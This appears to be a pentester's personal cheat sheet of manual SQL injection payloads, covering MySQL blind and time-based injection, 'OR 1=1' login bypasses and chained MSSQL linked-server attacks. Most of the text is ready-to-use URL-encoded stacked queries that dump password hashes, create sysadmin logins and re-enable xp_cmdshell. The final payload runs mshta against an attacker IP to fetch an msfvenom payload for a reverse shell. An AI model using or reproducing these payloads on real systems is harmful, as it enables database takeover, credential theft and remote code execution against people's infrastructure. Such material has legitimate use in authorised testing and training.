Manual MYSQL INJECTION Queries
-----------------------------
|
 -> Normal Blind Sql Injection
    UNION ALL SELECT NULL,(SELECT CONCAT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM information_schema.schemata LIMIT x,x),NULL,NULL-- w4fz5uck5

    Time-Based SQL Injection
    AND IF(SUBSTRING(version(),1,1)=CHAR(666), sleep(2), 'false')-- w4fz5uck5

    Login using whatever username:
      admin' OR 1=1-- -
      james' OR 1=1-- -
      jessica' OR 1=1-- -
      .....

MSSQL LINKED SERVER CONNECTION:
     https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf
     https://blog.netspi.com/wp-content/uploads/2017/05/Technical-Article-Hacking-SQL-Server-Database-Links-Setup-and-Attack-Guide.pdf
    
    CREATE USER:
         Create Users  EXEC sp_addlogin 'user', 'pass'; -- priv
         Drop Users  EXEC sp_droplogin 'user'; -- priv
         Make User DBA  EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; -- priv
         
ADVANCED MSSQL INJECTION:
--------------------------------

List internal databases:
Example machines:
192.168.0.103 -> SQL Injection machine 

Query:
192.168.0.103 -> SELECT srvname from master.sys.sysservers
--------------------------------

List internal databases from an internal database:
Example machines:
192.168.0.103 -> SQL Injection machine 
192.168.0.102 -> Another Internal MSSQL DB

Query:
192.168.0.103 -> SELECT srvname from [192.168.0.102].master.sys.sysservers
--------------------------------

Executing SA (System Administrator) commands without any password:
1 - Let's say that you got some SQL Injection but you haven't sysadmins privileges. So.. If your current SQLI user is allowed, you could  give a try to connect through in another Internal hosts, with SELECT or OPENQUERY functions, after that (if possible), perform code execution with sa (System Administrator) rights.

2 - The command below will extract account informations informations through "sa" user located in another internal (linked) Database ;)

Example machines:
192.168.0.103 -> SQL Injection machine 
192.168.0.102 -> Another Internal MSSQL DB

Query:
192.168.0.103 -> SELECT name,password_hash from [192.168.0.102].master.sys.sql_logins
--------------------------------
MSSQL inception queries trick!
192.168.0.103 -> SQL Injection machine 
192.168.0.102 -> First OPENQUERY() SA (System Administrator)
192.168.0.101 -> Second Internal MSSQL DB

1 - MSSQL Have some stupid and terribles methods to manage queries inside queries.. when you're performing pentesting you must to understand how to explore this kinda of shit.. especially with BLIND and TIME-BASED SQLI attacks!

So...

192.168.0.103 -> SELECT 1

192.168.0.103 -> SELECT * FROM OPENQUERY([192.168.0.102], 'select ''hi im w4fz5uck5'' ')

As you can see, the number of quote has multiplied by 2... let's continue with this piece of shit!

192.168.0.103 -> SELECT * FROM OPENQUERY([192.168.0.102], 'select * from openquery([192.168.0.101], ''select ''''hi im w4fz'''' '')') 

Now it's 4 quotes!....
Yep!! complicated? Not yet, now you can imagine this chain with 5 machines, or so on.. Obviously, it's hard to find companies with soooo many SA (system administrators) users with default configurations, but, i think it's possible..
--------------------------------

Get Linked Server Outputs:

1 - Linked  Servers outputs could be problematics when you're talking about texting.. the best way to that is inserting our output
inside some table, then read it after query execution:

2 - In the example below we're creating some table which will store our data!

Example machines:
192.168.0.103 -> SQL Injection machine 
192.168.0.102 -> First OPENQUERY() SA (System Administrator)
192.168.0.101 -> Second Internal MSSQL DB

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([192.168.0.102],''SELECT+srvname+FROM+[192.168.0.101].master.sys.sysservers'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ

4 - The SELECT output from 192.168.0.102 will return to our table!
3 - Now it's time to get the output :p
Example machines:
192.168.0.103 -> SQL Injection machine

Query:
192.168.0.103 -> SELECT * FROM dbo.w4fz
--------------------------------

GIMME MA REVERSE SHELL !!!

xp_cmdshell AND show advanced options functions, must to be activated in order to make MSSQL execute commands. By default, they're not! :( ... but, if you're lucky, AND sysadmin, you can be able to reactivate it! :D

True = 1
False = 0

=====Reactivating Show Advanced Options Func=====
====OPENROWSET() METHOD====
show advanced options = True:
OPENROWSET() -> Only will work if you have some credential, AND, sysadmin permissions

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 
uid -> user with SYSADMIN permission
pass -> user password

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENROWSET(''SQLOLEDB'',''server=[192.168.0.102];uid=<USER>;pwd=<PASS>'',''USE+MASTER;SET+FMTONLY+OFF+EXECUTE+sp_configure+''''show+advanced+options'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ

====OPENQUERY() METHOD====
show advanced options = True:
OPENQUERY() -> Will work without credentials but it's necessarily sysadmin permissions

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([192.168.0.102],''SET+FMTONLY+OFF+EXECUTE+sp_configure+''''show+advanced+options'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ
--------------------------------

=====Reactivating xp_cmdshell Func=====
====OPENROWSET() METHOD====
xp_cmdshell = True:
OPENROWSET() -> Only will work if you have some credential, AND, sysadmin permissions

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 
uid -> user with SYSADMIN permission
pass -> user password

Query:
192.168.0.103 -> 
'+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENR OWSET(''SQLOLEDB'',''server=[192.168.0.102];uid=<USER>;pwd=<PASS>'',''SET+FMTONLY+OFF+EXECUTE+sp_configure+''''xp_cmdshell'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ

====OPENQUERY() METHOD====
xp_cmdshell = True:
OPENQUERY() -> Will work without credentials but it's necessarily sysadmin permissions

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([192.168.0.102],''SET+FMTONLY+OFF+EXECUTE+sp_configure+''''xp_cmdshell'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ
--------------------------------

Check if xp_cmdshell or show advanced options is True or False:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 

Query:
192.168.0.103 -> select CAST(value_in_use AS INT) FROM [192.168.0.102].master.sys.configurations where name = "show advanced options"
192.168.0.103 -> select CAST(value_in_use AS INT) FROM [192.168.0.102].master.sys.configurations where name = "xp_cmdshell"

If the return is '1' in both... then you can perform remote code execution on the target host.
--------------------------------

Execute our xp_cmdshell:
Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> Host with xp_cmdshell and show advanced options == True (1)
192.168.30.20 -> Attacker IP

1 - Create  hta-psh (index.html) payload with msfvenom. 
2 - After that, list it in your python webserver then utilize "mshta" command in your target machine in order to get rev shell!
3 - mshta http://192.168.30.20  -> will access your webserver host and execute index.html file, then send you a rev shell!

Query:
192.168.0.103 - > '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([192.168.0.102],''SET+FMTONLY+OFF+EXECUTE+xp_cmdshell+''''mshta+http://192.168.30.20'''';'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ
--------------------------------      
         
TODO#
